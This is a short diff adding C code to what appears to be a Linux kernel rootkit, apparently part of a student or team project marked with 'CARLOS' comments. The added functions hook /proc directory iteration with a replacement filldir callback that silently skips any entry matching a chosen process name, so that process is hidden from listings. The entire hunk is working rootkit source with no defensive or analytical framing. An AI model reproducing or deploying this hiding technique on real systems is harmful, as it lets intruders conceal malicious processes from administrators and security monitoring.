@@ -230,10 +230,28 @@ static struct path p;
 
 struct dir_context *backup_ctx;
  
+static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len, loff_t off, u64 ino, unsigned int d_type){
+    if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
+        return 0;
+
+    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
+}
+
 struct dir_context rk_ctx = {
     .actor = rk_filldir_t,
 };
-//START CARLOS  
+
+int rk_iterate_shared(struct file *file, struct dir_context *ctx){
+    int result = 0;
+    rk_ctx.pos = ctx->pos;
+    backup_ctx = ctx;
+    result = backup_proc_fops->iterate_shared(file, &rk_ctx);
+    ctx->pos = rk_ctx.pos;
+
+    return result;
+}
+
+//END  CARLOS  
 
 
 
